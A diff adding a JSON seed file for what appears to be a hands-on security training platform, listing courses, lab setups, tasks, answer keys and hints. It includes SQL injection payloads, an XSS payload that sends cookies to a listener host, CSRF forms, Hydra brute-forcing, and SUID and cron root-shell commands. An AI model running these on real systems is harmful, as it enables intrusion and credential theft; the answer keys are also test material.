@@ -1,0 +1,2492 @@
+[
+  {
+    "course_id": "f8b8d428-48dd-4a35-b538-7485abbbdfb9",
+    "title": "cyber arcade",
+    "description": "blablablabla",
+    "difficulty_level": "intermediate",
+    "category": "web sec",
+    "estimated_hours": 8.0,
+    "is_published": false,
+    "labs": []
+  },
+  {
+    "course_id": "73d1bcfc-0569-40ce-877c-41c77eae1e80",
+    "title": "ahla group",
+    "description": "ahla groupp",
+    "difficulty_level": "intermediate",
+    "category": "websec",
+    "estimated_hours": 8.0,
+    "is_published": true,
+    "labs": []
+  },
+  {
+    "course_id": "d02ce97b-c29c-4b89-81d6-96fd2f20e565",
+    "title": "Web Application Security",
+    "description": "Master the most common web vulnerabilities including SQL injection, XSS, CSRF, and authentication bypass techniques. Learn to think like an attacker to build stronger defenses.",
+    "difficulty_level": "beginner",
+    "category": "Web Security",
+    "estimated_hours": 6.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "c1993f1a-225a-43f1-b153-bc49269f4089",
+        "title": "SQL Injection Fundamentals",
+        "description": "Learn how attackers manipulate SQL queries to bypass authentication and extract sensitive data from databases.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 45,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "4664e3af-e719-420d-942d-8587b94f5900",
+            "title": "Authentication Bypass",
+            "instructions": "The target web application has a login form vulnerable to SQL injection. Your goal is to bypass the authentication by crafting a malicious input that always evaluates to TRUE.\n\nTarget: http://10.10.14.5/login\n\nHint: Think about how the SQL query handles the username and password fields. What happens if you inject a condition that is always true?\n\nSubmit the exact payload you used in the username field.",
+            "expected_answer": "' OR '1'='1",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "659373b6-fa05-432d-9985-32395bd267ee",
+                "hint_text": "SQL queries often look like: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. What if you could close the quote early?",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "fab1681a-a300-41f6-9800-81900f45e5e1",
+                "hint_text": "Try injecting a single quote followed by OR and a condition that is always true. Don't forget to match the closing quote.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              },
+              {
+                "hint_id": "c2099572-f85c-47a7-b8c1-251d8af8e2bb",
+                "hint_text": "The payload is: ' OR '1'='1  — this makes the WHERE clause always true.",
+                "hint_order": 3,
+                "delay_minutes": 8
+              }
+            ]
+          },
+          {
+            "task_id": "ce0a451d-9e95-4b5d-ad88-abeb4e3347ed",
+            "title": "Database Enumeration",
+            "instructions": "Now that you can inject SQL, extract the database version from the target.\n\nUse a UNION-based SQL injection to retrieve the version string from the database.\n\nSubmit the SQL function name used to get the database version.",
+            "expected_answer": "version()",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "1bc71f7c-555f-4e99-b35c-86e0571887df",
+                "hint_text": "You can use UNION SELECT to append your own query results to the original query.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "716bcc47-619b-4391-af0b-12b4cfa09f88",
+                "hint_text": "In MySQL, the function to get the version is VERSION(). In PostgreSQL, it's version().",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "77d178a2-2de0-4c05-9630-43fa40c896ab",
+            "title": "Data Extraction",
+            "instructions": "Extract the admin password hash from the users table.\n\nUse your UNION-based injection to query the users table and find the admin account's password hash.\n\nSubmit the first 8 characters of the admin password hash.",
+            "expected_answer": "5f4dcc3b",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "d01c329d-850a-470f-bd2d-8155118a292f",
+                "hint_text": "First, enumerate the table names using information_schema.tables.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              },
+              {
+                "hint_id": "bd837f88-d059-4e58-91a1-42cab3026e91",
+                "hint_text": "Then query: UNION SELECT password FROM users WHERE username='admin'",
+                "hint_order": 2,
+                "delay_minutes": 6
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "328f8a96-fbbc-4cc0-9a0b-57e0ddccb7a1",
+        "title": "Cross-Site Scripting (XSS)",
+        "description": "Discover and exploit XSS vulnerabilities to steal session cookies, deface pages, and understand how client-side attacks work.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 40,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "15bbb406-6216-46f7-a609-36bdcf55f2ef",
+            "title": "Reflected XSS",
+            "instructions": "The search feature on the target website reflects user input without sanitization.\n\nTarget: http://10.10.14.5/search\n\nCraft a payload that triggers a JavaScript alert box showing 'XSS'.\n\nSubmit the exact payload.",
+            "expected_answer": "<script>alert('XSS')</script>",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "7040f419-a02d-4ffa-ba2f-fa2e55f293d9",
+                "hint_text": "The search term is reflected in the HTML response. What if the search term contained HTML tags?",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "72109bc7-0629-4f28-9881-849bdf8a0d9a",
+                "hint_text": "Try injecting <script> tags with JavaScript code inside.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "f0b92d85-7a0a-492f-a62a-3b87d47202f7",
+            "title": "Cookie Theft via XSS",
+            "instructions": "Now use XSS to steal the admin's session cookie.\n\nCraft a payload that sends document.cookie to your listener at http://10.10.14.2:4444.\n\nWhat JavaScript object contains the cookies?",
+            "expected_answer": "document.cookie",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "6230bee2-5e43-4b45-9d80-5334d030cf5e",
+                "hint_text": "Use document.cookie to access cookies, and new Image().src or fetch() to exfiltrate them.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "f3480697-d84c-4226-9057-8b175c39b61b",
+                "hint_text": "Payload: <script>new Image().src='http://10.10.14.2:4444/?c='+document.cookie</script>",
+                "hint_order": 2,
+                "delay_minutes": 6
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "1a3647c8-8ea9-4bfb-991c-2f9d74496980",
+        "title": "CSRF & Session Attacks",
+        "description": "Learn how Cross-Site Request Forgery works and practice crafting malicious pages that perform actions on behalf of authenticated users.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": false,
+        "max_duration_minutes": 50,
+        "sort_order": 2,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "473d36ad-6e2f-4916-838c-a3acce13843c",
+            "title": "Craft a CSRF Attack",
+            "instructions": "The target app's password change feature at /change-password does not validate the Origin header or use CSRF tokens.\n\nCreate an HTML page that, when visited by an admin, changes their password to 'hacked123'.\n\nWhat HTTP method does the password change form use?",
+            "expected_answer": "POST",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "2feb9da1-1e6f-4061-9390-8e6740b3a245",
+                "hint_text": "CSRF attacks work by submitting forms from an attacker-controlled page to the victim's authenticated session.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              },
+              {
+                "hint_id": "8bb6030e-b280-42b7-9fec-3db7d65b7ad0",
+                "hint_text": "Use an auto-submitting form: <form method='POST' action='...'><input type='hidden' ...></form><script>document.forms[0].submit()</script>",
+                "hint_order": 2,
+                "delay_minutes": 7
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "9cd1c91b-f9b4-4ddd-af23-15688da5bf89",
+    "title": "Network Penetration Testing",
+    "description": "Learn systematic network reconnaissance, service enumeration, and exploitation techniques used by professional penetration testers and red teamers.",
+    "difficulty_level": "intermediate",
+    "category": "Network Security",
+    "estimated_hours": 8.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "63391a64-535e-47aa-a940-e1536bb47934",
+        "title": "Network Reconnaissance with Nmap",
+        "description": "Master the industry-standard network scanner. Learn to discover hosts, enumerate open ports, identify services, and detect operating systems.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 35,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "f10dd98b-3bde-4a35-9c05-9c6617820621",
+            "title": "Port Discovery",
+            "instructions": "Scan the target machine at 10.10.14.5 and identify all open TCP ports.\n\nUse nmap with the -sV flag for version detection.\n\n```bash\nnmap -sV 10.10.14.5\n```\n\nHow many open ports did you find?",
+            "expected_answer": "3",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "ed06e21c-0bf9-431a-9d48-2e4f3adf6582",
+                "hint_text": "Run: nmap -sV 10.10.14.5 and count the ports listed as 'open'.",
+                "hint_order": 1,
+                "delay_minutes": 2
+              },
+              {
+                "hint_id": "8cf74489-69a4-44ab-86fc-29de8448ecda",
+                "hint_text": "The open ports are: 22 (SSH), 80 (HTTP), and 443 (HTTPS).",
+                "hint_order": 2,
+                "delay_minutes": 4
+              }
+            ]
+          },
+          {
+            "task_id": "9f807fb8-cafd-49ec-abd2-1257b63ca895",
+            "title": "Service Identification",
+            "instructions": "Identify the exact version of the SSH service running on port 22.\n\nUse nmap's version detection (-sV) or aggressive scan (-A).\n\nSubmit the SSH version string (e.g., OpenSSH X.Y).",
+            "expected_answer": "OpenSSH 8.9",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "754fdfd3-9587-4991-aeef-0034bc74c4e5",
+                "hint_text": "Run: nmap -sV -p22 10.10.14.5",
+                "hint_order": 1,
+                "delay_minutes": 2
+              },
+              {
+                "hint_id": "93896ae2-0807-446a-8cae-19043b1549bc",
+                "hint_text": "Look at the VERSION column in the nmap output for port 22.",
+                "hint_order": 2,
+                "delay_minutes": 4
+              }
+            ]
+          },
+          {
+            "task_id": "d9e0543e-61ab-463f-9ff4-fda187c4e019",
+            "title": "OS Detection",
+            "instructions": "Determine the operating system of the target machine.\n\nUse nmap's OS detection feature.\n\n```bash\nnmap -O 10.10.14.5\n```\n\nWhat OS family is the target running? (Linux/Windows)",
+            "expected_answer": "Linux",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "9b55032a-4061-4873-b6c0-e49cc8be0c51",
+                "hint_text": "The -O flag enables OS detection. You may need sudo/root privileges.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "919dac68-fa43-4d41-8921-a166e2b300df",
+        "title": "SSH Brute Force Attack",
+        "description": "Learn password guessing techniques using Hydra. Understand the importance of strong passwords and how attackers exploit weak credentials.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 30,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "e4c8fe57-591f-4e7e-aaff-30fdbce2c0a6",
+            "title": "Dictionary Attack",
+            "instructions": "Use Hydra to brute-force the SSH login on 10.10.14.5.\n\nA wordlist is provided at /usr/share/wordlists/rockyou.txt.\nThe username is 'admin'.\n\n```bash\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.5\n```\n\nWhat is the admin's password?",
+            "expected_answer": "password123",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "57bf1379-bad1-4163-a755-6869f7124488",
+                "hint_text": "Hydra will try each password from the wordlist. Watch for a line showing [22][ssh] host: 10.10.14.5 login: admin password: ???",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "70f62aa9-946f-4d87-afd7-7e9faccba725",
+                "hint_text": "The password is one of the most common passwords in the rockyou.txt wordlist.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "035d85cc-4497-4f54-8213-70ccd606d6e3",
+            "title": "Post-Exploitation",
+            "instructions": "Now that you have SSH access, log in and find the flag file.\n\n```bash\nssh admin@10.10.14.5\nfind / -name 'flag.txt' 2>/dev/null\ncat /home/admin/flag.txt\n```\n\nSubmit the flag contents.",
+            "expected_answer": "CTF{ssh_brut3_f0rc3_succ3ss}",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "ab8771e5-5555-4896-b19f-be523ca259bb",
+                "hint_text": "Use the 'find' command to search for flag.txt across the filesystem.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "b528cb79-164d-48da-b9b6-822e7c5f3d9f",
+                "hint_text": "The flag is located at /home/admin/flag.txt",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "698b72b9-5b6f-4108-9e2b-950770914607",
+        "title": "Wireshark Traffic Analysis",
+        "description": "Analyze network packet captures to detect attacks, extract credentials, and reconstruct communication flows.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": false,
+        "max_duration_minutes": 45,
+        "sort_order": 2,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "248a2c5b-6803-4505-ace7-9d1ec4eaa901",
+            "title": "Credential Sniffing",
+            "instructions": "Open the provided PCAP file in Wireshark and analyze the captured HTTP traffic.\n\nFilter for HTTP POST requests to find transmitted login credentials.\n\nWhat Wireshark display filter shows only HTTP POST requests?",
+            "expected_answer": "http.request.method == POST",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "634eb820-060f-46ea-959f-a853e14c17a8",
+                "hint_text": "Wireshark display filters use field names like http.request.method.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "66d0d59d-707f-4235-887e-5948345ca3f8",
+                "hint_text": "The filter syntax uses == for equality comparison.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "cf725e7a-1a76-4347-b9c4-12cc434fcda7",
+    "title": "Linux Privilege Escalation",
+    "description": "Learn to escalate from a low-privilege shell to root access on Linux systems. Cover SUID binaries, cron jobs, kernel exploits, and misconfigured services.",
+    "difficulty_level": "advanced",
+    "category": "Red Team",
+    "estimated_hours": 10.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "605e9e6e-4937-4481-b5f2-8c999a23fd66",
+        "title": "SUID Binary Exploitation",
+        "description": "Discover and exploit SUID binaries that can be abused to escalate privileges to root on a Linux target.",
+        "difficulty": "advanced",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 60,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "236fa961-2057-4528-b989-0902ff675a0f",
+            "title": "Find SUID Binaries",
+            "instructions": "You have a low-privilege shell on the target. Find all SUID binaries on the system.\n\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nWhat command-line flag in 'find' searches for SUID permissions?",
+            "expected_answer": "-perm -4000",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "a8bc064e-bb72-4eed-bc77-97454426e7c1",
+                "hint_text": "SUID files have the setuid bit set, which is represented as 4000 in octal permissions.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "02ebdc5c-a889-4d25-8fcc-abf6f8300392",
+                "hint_text": "Use find with -perm flag. The dash before 4000 means 'at least these permissions'.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "f3941c9f-a4e3-4a99-bada-5a945baad79e",
+            "title": "Exploit the Binary",
+            "instructions": "The /usr/bin/python3 binary has the SUID bit set (owned by root).\n\nUse it to spawn a root shell.\n\n```bash\n/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'  \n```\n\nWhat Python function is used to change the effective user ID to root?",
+            "expected_answer": "os.setuid",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "cce780fe-bba1-4166-a6a0-4e8f2eb298f7",
+                "hint_text": "When a SUID binary runs as root, you can use it to change your effective user ID.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              },
+              {
+                "hint_id": "446f75e2-22c6-4835-a3b2-bf0b078cc878",
+                "hint_text": "The os module in Python has setuid() and system() functions. setuid(0) = become root.",
+                "hint_order": 2,
+                "delay_minutes": 6
+              }
+            ]
+          },
+          {
+            "task_id": "f5423e4f-0f05-4345-9bb7-9fcee414095a",
+            "title": "Capture the Root Flag",
+            "instructions": "Now that you have root access, read the flag file.\n\n```bash\ncat /root/flag.txt\n```\n\nSubmit the flag.",
+            "expected_answer": "CTF{su1d_pr1v3sc_r00t3d}",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "b5a9e931-4040-42b4-a8c4-f36a71ed3701",
+                "hint_text": "Root flags are typically stored in /root/.",
+                "hint_order": 1,
+                "delay_minutes": 2
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "9928db8d-c4ab-46f7-b888-68ea8b38881d",
+        "title": "Cron Job Hijacking",
+        "description": "Exploit misconfigured cron jobs to achieve privilege escalation by modifying scripts that run as root.",
+        "difficulty": "advanced",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 50,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "ac97eced-8fa4-48b5-a3c9-4f4eb9ba003f",
+            "title": "Discover Cron Jobs",
+            "instructions": "Enumerate the system's scheduled cron jobs to find one running as root.\n\n```bash\ncat /etc/crontab\nls -la /etc/cron.d/\n```\n\nWhat file contains system-wide cron job definitions?",
+            "expected_answer": "/etc/crontab",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "0a12e8df-cc47-4f02-9440-125c8991bca1",
+                "hint_text": "System-wide cron jobs are defined in /etc/crontab and files within /etc/cron.d/.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              }
+            ]
+          },
+          {
+            "task_id": "4391ece5-33a4-44ad-9355-523a1408da49",
+            "title": "Hijack the Script",
+            "instructions": "A cron job runs /opt/backup.sh as root every minute, and the file is world-writable.\n\nModify the script to add a reverse shell or create a root SUID shell.\n\n```bash\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh\n```\n\nAfter 1 minute, run: /tmp/rootbash -p\n\nWhat flag makes bash preserve the SUID effective UID?",
+            "expected_answer": "-p",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "38940786-1db2-453c-8a6e-f6da07bd0f60",
+                "hint_text": "Bash drops privileges by default. The -p flag tells it to keep the effective UID.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "4cf2ad52-c767-4a78-aba1-6867cb53ef08",
+    "title": "Web Application Security",
+    "description": "Master the most common web vulnerabilities including SQL injection, XSS, CSRF, and authentication bypass techniques. Learn to think like an attacker to build stronger defenses.",
+    "difficulty_level": "beginner",
+    "category": "Web Security",
+    "estimated_hours": 6.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "a5ab7ef6-cd8e-449d-bab1-ac3c1cda34c7",
+        "title": "SQL Injection Fundamentals",
+        "description": "Learn how attackers manipulate SQL queries to bypass authentication and extract sensitive data from databases.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 45,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "ffdc9b80-a2c8-454f-9686-793bd277fdee",
+            "title": "Authentication Bypass",
+            "instructions": "The target web application has a login form vulnerable to SQL injection. Your goal is to bypass the authentication by crafting a malicious input that always evaluates to TRUE.\n\nTarget: http://10.10.14.5/login\n\nHint: Think about how the SQL query handles the username and password fields. What happens if you inject a condition that is always true?\n\nSubmit the exact payload you used in the username field.",
+            "expected_answer": "' OR '1'='1",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "cbf675fc-5cc6-4dbd-acd1-600a8b973c7d",
+                "hint_text": "SQL queries often look like: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. What if you could close the quote early?",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "0476e754-5d87-4444-962b-e8af217ad101",
+                "hint_text": "Try injecting a single quote followed by OR and a condition that is always true. Don't forget to match the closing quote.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              },
+              {
+                "hint_id": "4339e5a4-b20a-4724-b354-b16c6571e1d7",
+                "hint_text": "The payload is: ' OR '1'='1  — this makes the WHERE clause always true.",
+                "hint_order": 3,
+                "delay_minutes": 8
+              }
+            ]
+          },
+          {
+            "task_id": "5057dadd-0e06-4847-97df-722949beabfa",
+            "title": "Database Enumeration",
+            "instructions": "Now that you can inject SQL, extract the database version from the target.\n\nUse a UNION-based SQL injection to retrieve the version string from the database.\n\nSubmit the SQL function name used to get the database version.",
+            "expected_answer": "version()",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "23ac9c55-294e-4c0a-8eab-aeacd73a959d",
+                "hint_text": "You can use UNION SELECT to append your own query results to the original query.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "52a10ebf-2704-4c70-badf-26b3ee6ed5ad",
+                "hint_text": "In MySQL, the function to get the version is VERSION(). In PostgreSQL, it's version().",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "686df16f-cceb-417b-acea-c7fa4b9c3ca6",
+            "title": "Data Extraction",
+            "instructions": "Extract the admin password hash from the users table.\n\nUse your UNION-based injection to query the users table and find the admin account's password hash.\n\nSubmit the first 8 characters of the admin password hash.",
+            "expected_answer": "5f4dcc3b",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "04526e6e-e395-40e5-98ab-3c9b89d11ac8",
+                "hint_text": "First, enumerate the table names using information_schema.tables.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              },
+              {
+                "hint_id": "19b0026f-bc60-4eaf-a2b8-cf5d428d155f",
+                "hint_text": "Then query: UNION SELECT password FROM users WHERE username='admin'",
+                "hint_order": 2,
+                "delay_minutes": 6
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "c69f3c18-de5b-44fd-be42-551b8de4410c",
+        "title": "Cross-Site Scripting (XSS)",
+        "description": "Discover and exploit XSS vulnerabilities to steal session cookies, deface pages, and understand how client-side attacks work.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 40,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "282beadf-6eea-4d84-aac3-6f946367b741",
+            "title": "Reflected XSS",
+            "instructions": "The search feature on the target website reflects user input without sanitization.\n\nTarget: http://10.10.14.5/search\n\nCraft a payload that triggers a JavaScript alert box showing 'XSS'.\n\nSubmit the exact payload.",
+            "expected_answer": "<script>alert('XSS')</script>",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "51824e85-67c8-4bca-8c3f-c2f86d2ab516",
+                "hint_text": "The search term is reflected in the HTML response. What if the search term contained HTML tags?",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "6597a995-279e-4843-8651-14db349a04da",
+                "hint_text": "Try injecting <script> tags with JavaScript code inside.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "0c091547-af27-4de7-a7a1-8d734a6a0e0d",
+            "title": "Cookie Theft via XSS",
+            "instructions": "Now use XSS to steal the admin's session cookie.\n\nCraft a payload that sends document.cookie to your listener at http://10.10.14.2:4444.\n\nWhat JavaScript object contains the cookies?",
+            "expected_answer": "document.cookie",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "3db28b77-95cd-4307-b53e-f9835e70dff3",
+                "hint_text": "Use document.cookie to access cookies, and new Image().src or fetch() to exfiltrate them.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "2309e84d-23b6-43bb-917e-42d187b24447",
+                "hint_text": "Payload: <script>new Image().src='http://10.10.14.2:4444/?c='+document.cookie</script>",
+                "hint_order": 2,
+                "delay_minutes": 6
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "8b4522b7-0fe1-40ff-8042-c86b4a2631fa",
+        "title": "CSRF & Session Attacks",
+        "description": "Learn how Cross-Site Request Forgery works and practice crafting malicious pages that perform actions on behalf of authenticated users.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": false,
+        "max_duration_minutes": 50,
+        "sort_order": 2,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "93254b32-3b5f-4428-88e7-d25d4964b6da",
+            "title": "Craft a CSRF Attack",
+            "instructions": "The target app's password change feature at /change-password does not validate the Origin header or use CSRF tokens.\n\nCreate an HTML page that, when visited by an admin, changes their password to 'hacked123'.\n\nWhat HTTP method does the password change form use?",
+            "expected_answer": "POST",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "f5907911-e793-40fe-9d02-5d1858402fe2",
+                "hint_text": "CSRF attacks work by submitting forms from an attacker-controlled page to the victim's authenticated session.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              },
+              {
+                "hint_id": "77980559-174c-4c8f-83ed-ff3a49500641",
+                "hint_text": "Use an auto-submitting form: <form method='POST' action='...'><input type='hidden' ...></form><script>document.forms[0].submit()</script>",
+                "hint_order": 2,
